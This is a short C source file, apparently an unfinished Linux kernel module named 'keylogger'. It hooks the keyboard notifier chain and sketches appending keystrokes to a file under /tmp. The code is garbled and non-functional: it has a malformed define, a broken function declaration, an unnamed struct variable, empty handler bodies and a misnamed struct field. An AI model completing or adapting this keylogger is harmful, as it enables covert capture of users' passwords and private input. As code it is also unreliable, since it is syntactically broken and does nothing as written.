#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/kernel.h>
#include <unistd.h>
#include <linux/fs.h>

define PATH = /tmp 

int register_chardev(unsigned int //major, "keylogger",   )

void save_data(char key)
{
    struct file* = file_open(*PATH, O_CREAT | O_APPEND, );
    
}
int notifier(struct notifier_block *block, unsigned long code, void *p)
{
    struct keyboard_notifier_param *param;
    char *tmp;

}
static struct notifier_block keylogger ={.notifier = notifier};






static int __init MOD_LOAD(void)
{
    /*call the notifier*/
    register_keyboard_notifier(&keylogger);

}
static void __exit MOD_UNLOAD(void)
{
    unregister_keyboard_notifier(&keylogger);
} 